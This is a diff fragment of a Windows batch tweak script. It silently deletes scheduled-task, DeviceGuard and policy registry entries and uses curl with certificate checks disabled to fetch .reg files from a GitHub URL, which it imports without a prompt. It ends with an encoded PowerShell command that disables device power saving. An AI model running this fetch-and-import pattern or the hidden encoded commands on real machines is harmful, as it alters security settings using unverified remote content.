+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\USB" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\User Profile Service" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\WindowsUpdate\Scheduled Start" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{41F5FC9D-EE65-4CA4-A908-91B3587198E0}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{41F5FC9D-EE65-4CA4-A908-91B3587198E0}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\XblGameSave" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers" /v "Adobe Type Manager" /f >nul 2>&1
+Reg.exe delete "HKLM\System\ControlSet001\Control\Terminal Server\Wds\rdpwd" /v "StartupPrograms" /f >nul 2>&1
+Reg.exe delete "HKCR\Directory\background\shell\FoxOS. Made by CatGamerOP" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /f >nul 2>&1
+Reg.exe delete "HKCU\Software\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f >nul 2>&1
+Reg.exe delete "HKU\S-1-5-18\Software\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f >nul 2>&1
+Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Id" /f >nul 2>&1
+Reg.exe delete "HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Id" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\ControlSet001\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "ChangedInBootCycle" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\ControlSet001\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "WasEnabledBy" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\ScheduledDiagnostics" /v "EnabledExecution" /f >nul 2>&1
+
+curl -g -k -L -# -o "colors.reg" "https://raw.githubusercontent.com/DOCSDROPT/OPTF_1/main/SRTTP/colors.reg" >nul 2>&1
+curl -g -k -L -# -o "REG.reg" "https://raw.githubusercontent.com/DOCSDROPT/OPTF_1/main/SRTTP/REG.reg" >nul 2>&1
+curl -g -k -L -# -o "DNS.reg" "https://raw.githubusercontent.com/DOCSDROPT/OPTF_1/main/SRTTP/DNS.reg" >nul 2>&1
+@timeout /t 01>nul
+Reg.exe import colors.reg >nul 2>&1
+Reg.exe import REG.reg >nul 2>&1
+Reg.exe import DNS.reg >nul 2>&1
+
+powershell.exe -encodedCommand JABkAGUAdgBpAGMAZQBzAFUAUwBCACAAPQAgAEcAZQB0AC0AUABuAHAARABlAHYAaQBjAGUAIAB8ACAAdwBoAGUAcgBlACAAewAkAF8ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQBsAGkAawBlACAAIgAqAFUAUwBCAFwAUgBPAE8AVAAqACIAfQAgACAAfAAgAA0ACgBGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAGMAZQBzAHMAIAB7AA0ACgBHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzAE4AYQBtAGUAIABNAFMAUABvAHcAZQByAF8ARABlAHYAaQBjAGUARQBuAGEAYgBsAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdABcAHcAbQBpACAADQAKAH0ADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAgACQAZABlAHYAaQBjAGUAIABpAG4AIAAkAGQAZQB2AGkAYwBlAHMAVQBTAEIAIAApAA0ACgB7AA0ACgAgACAAIAAgAFMAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXAB3AG0AaQAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAATQBTAFAAbwB3AGUAcgBfAEQAZQB2AGkAYwBlAEUAbgBhAGIAbABlACAAVwBIAEUAUgBFACAASQBuAHMAdABhAG4AYwBlAE4AYQBtAGUAIABMAEkASwBFACAAJwAlACQAKAAkAGQAZQB2AGkAYwBlAC4AUABOAFAARABlAHYAaQBjAGUASQBEACkAJQAnACIAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewBFAG4AYQBiAGwAZQA9ACQARgBhAGwAcwBlAH0AIAAtAFAAYQBzAHMAVABoAHIAdQANAAoAfQANAAoADQAKACQAYQBkAGEAcAB0AGUAcgBzACAAPQAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgAgAC0AUABoAHkAcwBpAGMAYQBsACAAfAAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgBQAG8AdwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGEAZABhAHAAdABlAHIAIABpAG4AIAAkAGEAZABhAHAAdABlAHIAcwApAA0ACgAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAuAEEAbABsAG8AdwBDAG8AbQBwAHUAdABlAHIAVABvAFQAdQByAG4ATwBmAGYARABlAHYAaQBjAGUAIAA9ACAAJwBEAGkAcwBhAGIAbABlAGQAJwANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAgAHwAIABTAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAUABvAHcAZQByAE0AYQBuAGEAZwBlAG0AZQBuAHQADQAKACAAIAAgACAAIAAgACAAIAB9AA== >nul 2>&1
 goto :MAINW
